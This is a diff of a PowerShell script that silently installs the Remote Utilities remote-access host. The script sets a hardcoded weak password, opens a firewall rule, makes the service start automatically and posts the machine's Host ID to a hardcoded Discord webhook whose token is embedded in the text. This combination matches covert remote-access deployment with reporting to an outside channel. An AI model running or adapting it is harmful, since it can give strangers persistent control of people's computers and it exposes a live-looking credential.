@@ -3,18 +3,12 @@
 # --------------------------------------------------------------
 
 # ------------------- 0️⃣ USER SETTINGS -------------------------
-# Set your Discord webhook – you can also set the environment variable
-# $env:RU_DISCORD_WEBHOOK before calling the script.
 $discordWebhook = $env:RU_DISCORD_WEBHOOK `
     ?? "https://discord.com/api/webhooks/1493692725919219792/LCiq_4OQ2jPQyPD9SrkMx7ux7oHAhSQOS5s4NZ1_H4aXU4eVpZm4SS2c8NsLwRVE2xGT"
 
-# Strong password for the host (change per machine if you like)
 $hostPassword = "FreePwd123!"
+$downloadUrl  = "https://www.remoteutilities.com/download/RemoteUtilities_Desktop_17_4_0.exe"
 
-# Remote Utilities free installer URL (latest free build)
-$downloadUrl = "https://www.remoteutilities.com/download/RemoteUtilities_Desktop_17_4_0.exe"
-
-# --------------------------------------------------------------
 $installerPath = "$env:TEMP\RU-Setup.exe"
 $hostName      = $env:COMPUTERNAME
 $hostKey       = "HKLM:\SOFTWARE\Remote Utilities\Host"
@@ -24,13 +18,12 @@ $serviceName   = "RemoteUtilitiesHost"
 Invoke-WebRequest -Uri $downloadUrl -OutFile $installerPath -UseBasicParsing
 
 # 2️⃣ Silent install
-Start-Process -FilePath $installerPath -ArgumentList "/SILENT", "/NORESTART" -Wait -NoNewWindow
+Start-Process -FilePath $installerPath -ArgumentList "/SILENT","/NORESTART" -Wait -NoNewWindow
 
 # 3️⃣ Configure host (password)
 if (-not (Test-Path $hostKey)) { New-Item -Path $hostKey -Force | Out-Null }
 Set-ItemProperty -Path $hostKey -Name "HostName" -Value $hostName
 
-# MD5 hash of the password (Remote Utilities requirement)
 $md5      = [System.Security.Cryptography.MD5]::Create()
 $hashHex  = ($md5.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hostPassword)) |
             ForEach-Object { $_.ToString("x2") }) -join ""
@@ -45,17 +38,14 @@ New-NetFirewallRule -DisplayName "Remote Utilities Host" `
 Set-Service -Name $serviceName -StartupType Automatic
 Start-Service -Name $serviceName
 
-# 6️⃣ Retrieve Host ID (wait a moment if it isn’t there yet)
+# 6️⃣ Retrieve Host ID
 $hostID = (Get-ItemProperty -Path $hostKey -Name HostID -ErrorAction SilentlyContinue).HostID
-if (-not $hostID) {
-    Start-Sleep -Seconds 5
-    $hostID = (Get-ItemProperty -Path $hostKey -Name HostID).HostID
-}
+if (-not $hostID) { Start-Sleep -Seconds 5; $hostID = (Get-ItemProperty -Path $hostKey -Name HostID).HostID }
 
 # 7️⃣ Send Discord notification (optional)
 if ($discordWebhook -and $hostID) {
     $payload = @{
-        username = "RU‑Free‑Installer"
+        username = "RU-Free-Installer"
         embeds   = @(
             @{
                 title       = "Remote Utilities Host ready"
@@ -70,11 +60,8 @@ if ($discordWebhook -and $hostID) {
         )
     } | ConvertTo-Json -Depth 4
 
-    try {
-        Invoke-RestMethod -Uri $discordWebhook -Method Post -ContentType "application/json" -Body $payload
-    } catch {
-        Write-Warning "Discord post failed: $_"
-    }
+    try { Invoke-RestMethod -Uri $discordWebhook -Method Post -ContentType "application/json" -Body $payload }
+    catch { Write-Warning "Discord post failed: $_" }
 } else {
     Write-Warning "Discord webhook URL or Host ID missing – no notification sent."
 }
